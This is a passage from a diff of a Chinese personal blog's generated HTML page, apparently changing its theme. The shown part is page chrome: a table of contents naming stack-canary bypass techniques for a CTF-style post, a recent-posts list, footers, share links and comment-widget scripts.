class="toc-text">五、劫持stack_chk_fail函数泄露canary</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%AD%E3%80%81%E4%BF%AE%E6%94%B9TSL%E7%BB%95%E8%BF%87canary"><span class="toc-number">1.0.6.</span> <span class="toc-text">六、修改TSL绕过canary</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2024/06/22/Java%E6%9D%82%E8%AE%B0/" title="Java基础知识杂记"><img src="https://tse4-mm.cn.bing.net/th/id/OIP-C.ZCGnC5HDT4Rwr8DPTY6UiQHaEf?w=300&amp;h=182&amp;c=7&amp;r=0&amp;o=5&amp;dpr=1.3&amp;pid=1.7" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Java基础知识杂记"/></a><div class="content"><a class="title" href="/2024/06/22/Java%E6%9D%82%E8%AE%B0/" title="Java基础知识杂记">Java基础知识杂记</a><time datetime="2024-06-21T16:00:00.000Z" title="发表于 2024-06-22 00:00:00">2024-06-22</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/01/09/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%A2%8E%E7%89%87/" title="数据结构"><img src="https://gd-hbimg.huaban.com/860d15845530de80118005269b1d96b4d9aa44756a834-Abxbe0_fw240webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="数据结构"/></a><div class="content"><a class="title" href="/2024/01/09/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%A2%8E%E7%89%87/" title="数据结构">数据结构</a><time datetime="2024-01-09T09:51:16.000Z" title="发表于 2024-01-09 17:51:16">2024-01-09</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/12/24/The%20Missing%20Semester%20of%20Your%20CS%20Education/" title="The Missing Semester of Your CS Education"><img src="/../imgs/2024-10/miss.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="The Missing Semester of Your CS Education"/></a><div class="content"><a class="title" href="/2023/12/24/The%20Missing%20Semester%20of%20Your%20CS%20Education/" title="The Missing Semester of Your CS Education">The Missing Semester of Your CS Education</a><time datetime="2023-12-24T03:36:16.000Z" title="发表于 2023-12-24 11:36:16">2023-12-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/11/27/NepCTF%202023/" title="Nep摸鱼记"><img src="https://ts2.cn.mm.bing.net/th?id=OIP-C.lXXyg9_hRePKHUIpWoiMUwHaFP&amp;w=297&amp;h=210&amp;c=8&amp;rs=1&amp;qlt=90&amp;o=6&amp;dpr=1.3&amp;pid=3.1&amp;rm=2" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Nep摸鱼记"/></a><div class="content"><a class="title" href="/2023/11/27/NepCTF%202023/" title="Nep摸鱼记">Nep摸鱼记</a><time datetime="2023-11-26T16:00:00.000Z" title="发表于 2023-11-27 00:00:00">2023-11-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/09/01/C%E6%8E%A2%E7%B4%A2%E7%A2%8E%E7%89%87%E2%80%94%E2%80%94static%E7%9A%84%E4%BD%9C%E7%94%A8/" title="C探索碎片——关键字static作用"><img src="https://png.pngtree.com/thumb_back/fh260/back_our/20190622/ourmid/pngtree-blue-sky-free-illustration-image_221359.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="C探索碎片——关键字static作用"/></a><div class="content"><a class="title" href="/2023/09/01/C%E6%8E%A2%E7%B4%A2%E7%A2%8E%E7%89%87%E2%80%94%E2%80%94static%E7%9A%84%E4%BD%9C%E7%94%A8/" title="C探索碎片——关键字static作用">C探索碎片——关键字static作用</a><time datetime="2023-08-31T16:00:00.000Z" title="发表于 2023-09-01 00:00:00">2023-09-01</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2022 - 2024 By yub</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: 'WwVGEcmjEUSp1C3qQTlW8CcS-gzGzoHsz',
+      appKey: 'tqbDrZC8pSB03urdpjIK5oC9',
+      avatar: 'monsterid',
+      serverURLs: '',
+      emojiMaps: "",
+      path: window.location.pathname,
+      visitor: true
+    }, ))
+  }
 
-  </div>
-</article>
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
 
-
-
-
-
-        
-          <div id="footer-post-container">
-  <div id="footer-post">
-
-    <div id="nav-footer" style="display: none">
-      <ul>
-        
-          <li><a href="/">Home</a></li>
-        
-          <li><a href="/about/">About</a></li>
-        
-          <li><a href="/archives/">Articles</a></li>
-        
-          <li><a href="/categories/">Categories</a></li>
-        
-          <li><a href="/links/">Links</a></li>
-        
-          <li><a href="/tags/">Tags</a></li>
-        
-          <li><a href="/search/">Search</a></li>
-        
-      </ul>
-    </div>
-
-    
-    
-      <div id="toc-footer" style="display: none">
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Canary%E8%A7%A3%E5%86%B3%E5%A7%BF%E5%8A%BF"><span class="toc-number">1.</span> <span class="toc-text">Canary解决姿势</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%80%E3%80%81canary%E7%88%86%E7%A0%B4"><span class="toc-number">1.0.1.</span> <span class="toc-text">一、canary爆破</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E8%A6%86%E7%9B%96%E6%88%AA%E6%96%AD%E5%AD%97%E7%AC%A6%EF%BC%88-x00%EF%BC%89%E8%8E%B7%E5%8F%96canary"><span class="toc-number">1.0.2.</span> <span class="toc-text">二、覆盖截断字符（\x00）获取canary</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E5%88%A9%E7%94%A8%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%8E%B7%E5%8F%96canary"><span class="toc-number">1.0.3.</span> <span class="toc-text">三、利用格式化字符串获取canary</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9B%9B%E3%80%81SSP-Leak%E5%88%A9%E7%94%A8canary"><span class="toc-number">1.0.4.</span> <span class="toc-text">四、SSP Leak利用canary</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BA%94%E3%80%81%E5%8A%AB%E6%8C%81stack-chk-fail%E5%87%BD%E6%95%B0%E6%B3%84%E9%9C%B2canary"><span class="toc-number">1.0.5.</span> <span class="toc-text">五、劫持stack_chk_fail函数泄露canary</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%AD%E3%80%81%E4%BF%AE%E6%94%B9TSL%E7%BB%95%E8%BF%87canary"><span class="toc-number">1.0.6.</span> <span class="toc-text">六、修改TSL绕过canary</span></a></li></ol></li></ol></li></ol>
-      </div>
-    
-
-    <div id="share-footer" style="display: none">
-      <ul>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://yubut.github.io/2023/09/01/Canary%E8%A7%A3%E5%86%B3%E5%A7%BF%E5%8A%BF/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://yubut.github.io/2023/09/01/Canary%E8%A7%A3%E5%86%B3%E5%A7%BF%E5%8A%BF/&text=Canary解决姿势"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://yubut.github.io/2023/09/01/Canary%E8%A7%A3%E5%86%B3%E5%A7%BF%E5%8A%BF/&title=Canary解决姿势"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://yubut.github.io/2023/09/01/Canary%E8%A7%A3%E5%86%B3%E5%A7%BF%E5%8A%BF/&is_video=false&description=Canary解决姿势"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=Canary解决姿势&body=Check out this article: https://yubut.github.io/2023/09/01/Canary%E8%A7%A3%E5%86%B3%E5%A7%BF%E5%8A%BF/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://yubut.github.io/2023/09/01/Canary%E8%A7%A3%E5%86%B3%E5%A7%BF%E5%8A%BF/&title=Canary解决姿势"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://yubut.github.io/2023/09/01/Canary%E8%A7%A3%E5%86%B3%E5%A7%BF%E5%8A%BF/&title=Canary解决姿势"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://yubut.github.io/2023/09/01/Canary%E8%A7%A3%E5%86%B3%E5%A7%BF%E5%8A%BF/&title=Canary解决姿势"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://yubut.github.io/2023/09/01/Canary%E8%A7%A3%E5%86%B3%E5%A7%BF%E5%8A%BF/&title=Canary解决姿势"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://yubut.github.io/2023/09/01/Canary%E8%A7%A3%E5%86%B3%E5%A7%BF%E5%8A%BF/&name=Canary解决姿势&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://yubut.github.io/2023/09/01/Canary%E8%A7%A3%E5%86%B3%E5%A7%BF%E5%8A%BF/&t=Canary解决姿势"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
-</ul>
-
-    </div>
-
-    <div id="actions-footer">
-        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
-        
-          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
-        
-        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
-        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
-    </div>
-
-  </div>
-</div>
-
-        
-        <footer id="footer">
-    <div class="footer-left">
-        Copyright ©
-        
-        
-        2023-2024
-        yub
-        <br>
-        <!-- 删除备案信息，如果不需要备案可以省略以下行 -->
-        <!-- <a href="https://beian.miit.gov.cn/" target="_blank">xICP备xxxxxxxx号-x</a> -->
-    </div>
-
-    <div class="footer-right">
-        <nav>
-            <ul>
-                
-                <li><a href="/">Home</a></li>
-                
-                <li><a href="/about/">About</a></li>
-                
-                <li><a href="/archives/">Articles</a></li>
-                
-                <li><a href="/categories/">Categories</a></li>
-                
-                <li><a href="/links/">Links</a></li>
-                
-                <li><a href="/tags/">Tags</a></li>
-                
-                <li><a href="/search/">Search</a></li>
-                
-            </ul>
-            
-            <ul>
-                <span id="busuanzi_container_site_pv">
-                    本站总访问量<span id="busuanzi_value_site_pv"></span>次
-                </span>
-                <span class="post-meta-divider">|</span>
-                <span id="busuanzi_container_site_uv" style='display:none'>
-                    本站访客数<span id="busuanzi_value_site_uv"></span>人
-                </span>
-                <!-- 引入不蒜子脚本 -->
-                <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-            </ul>
-            
-        </nav>
-    </div>
-</footer>
-
-    </div>
-    <!-- styles -->
-
-
-
-  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
-
-
-    <!-- jquery -->
-
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
-
-
-
-
-<!-- clipboard -->
-
-  
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
-  
-  <script type="text/javascript">
-  $(function() {
-    // copy-btn HTML
-    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
-    btn += '<i class="fa-regular fa-clone"></i>';
-    btn += '</span>';
-    // mount it!
-    $(".highlight table").before(btn);
-    var clip = new ClipboardJS('.btn-copy', {
-      text: function(trigger) {
-        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
-      }
-    });
-    clip.on('success', function(e) {
-      e.trigger.setAttribute('aria-label', "复制成功！");
-      e.clearSelection();
-    })
-  })
-  </script>
-
-
-<script src="/js/main.js"></script>
-
-<!-- search -->
-
-<!-- Baidu Analytics -->
-
-<!-- Cloudflare Analytics -->
-
-<!-- Disqus Comments -->
-
-<!-- utterances Comments -->
-
-</body>
-</html>
+if ('Valine' === 'Valine' || !false) {
+  if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script></div><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = true;
+document.body.addEventListener('input', POWERMODE);
+</script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="true" data-text="I,LOVE,YOU" data-fontsize="15px" data-random="true" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div class="no-result" id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
